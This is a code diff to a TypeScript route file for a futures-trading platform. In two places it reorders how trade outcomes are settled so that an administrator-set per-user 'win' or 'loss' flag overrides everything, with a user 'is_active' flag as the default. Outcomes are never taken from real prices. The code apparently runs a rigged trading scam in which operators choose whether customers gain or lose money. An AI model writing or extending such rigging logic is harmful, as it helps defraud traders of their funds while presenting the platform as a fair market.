@@ -586,16 +586,16 @@ export default function registerFuturesRoutes(app: Express) {
       let isWin = false;
       let exitPrice = currentPrice;
 
-      // Determine outcome: per-user forced result takes priority
+      // Determine outcome: forced result (admin override) takes absolute priority
       const forcedResult = userData.futures_trade_result; // null, 'win', or 'loss'
       let shouldWin: boolean;
 
-      if (availableBalance < tradeAmount) {
-        // Insufficient balance always loses
-        shouldWin = false;
-      } else if (forcedResult === 'win') {
+      if (forcedResult === 'win') {
         shouldWin = true;
       } else if (forcedResult === 'loss') {
+        shouldWin = false;
+      } else if (availableBalance < tradeAmount) {
+        // Insufficient balance loses (only for non-forced users)
         shouldWin = false;
       } else {
         // Default: use is_active flag
@@ -788,15 +788,16 @@ export default function registerFuturesRoutes(app: Express) {
           let profitLoss = 0;
           let exitPrice = currentPrice;
 
-          // Determine outcome: per-user forced result takes priority
+          // Determine outcome: forced result (admin override) takes absolute priority
           const forcedResult = userData.futures_trade_result;
           let shouldWin: boolean;
 
-          if (availableBalance < trade.amount) {
-            shouldWin = false;
-          } else if (forcedResult === 'win') {
+          if (forcedResult === 'win') {
             shouldWin = true;
           } else if (forcedResult === 'loss') {
+            shouldWin = false;
+          } else if (availableBalance < trade.amount) {
+            // Insufficient balance loses (only for non-forced users)
             shouldWin = false;
           } else {
             shouldWin = userData.is_active !== false;
